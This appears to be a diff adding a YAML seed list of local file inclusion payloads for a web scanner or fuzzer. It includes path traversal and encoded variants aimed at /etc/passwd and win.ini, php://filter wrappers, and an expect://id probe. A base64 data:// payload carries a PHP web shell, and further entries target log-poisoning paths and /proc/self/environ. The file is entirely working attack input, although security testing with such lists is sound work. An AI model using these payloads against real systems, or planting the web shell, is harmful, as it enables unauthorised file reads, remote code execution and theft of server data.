@@ -1,0 +1,55 @@
+# LFI payload expansion: more wrappers, encodings, log paths
+seeds:
+  lfi:
+    traversal:
+      - raw: "../../../../etc/passwd"
+        indicator: "root:"
+        ctx: ["all"]
+      - raw: "..\\..\\..\\windows\\win.ini"
+        indicator: "[fonts]"
+        ctx: ["all"]
+      - raw: "../../../../etc/passwd%00"
+        indicator: "root:"
+        ctx: ["all"]
+    encoded:
+      - raw: "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd"
+        indicator: "root:"
+        ctx: ["all"]
+      - raw: "..%252f..%252f..%252fetc/passwd"
+        indicator: "root:"
+        ctx: ["all"]
+      - raw: "..%c0%af..%c0%af..%c0%afetc/passwd"
+        indicator: "root:"
+        ctx: ["all"]
+      - raw: "....//....//....//etc/passwd"
+        indicator: "root:"
+        ctx: ["all"]
+    php_wrappers:
+      - raw: "php://filter/convert.base64-encode/resource=/etc/passwd"
+        type: "base64"
+        ctx: ["all"]
+      - raw: "php://filter/read=string.rot13/resource=/etc/passwd"
+        type: "rot13"
+        ctx: ["all"]
+      - raw: "php://filter/convert.iconv.utf-8.utf-16/resource=/etc/passwd"
+        type: "iconv"
+        ctx: ["all"]
+      - raw: "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg=="
+        type: "rce"
+        ctx: ["all"]
+      - raw: "expect://id"
+        indicator: "uid="
+        ctx: ["all"]
+      - raw: "compress.zlib://php://filter/convert.base64-encode/resource=/etc/passwd"
+        type: "base64"
+        ctx: ["all"]
+    log_poison:
+      - raw: "/var/log/apache2/access.log"
+        indicator: "GET"
+        ctx: ["all"]
+      - raw: "/var/log/nginx/access.log"
+        indicator: "GET"
+        ctx: ["all"]
+      - raw: "/proc/self/environ"
+        indicator: "PATH="
+        ctx: ["all"]
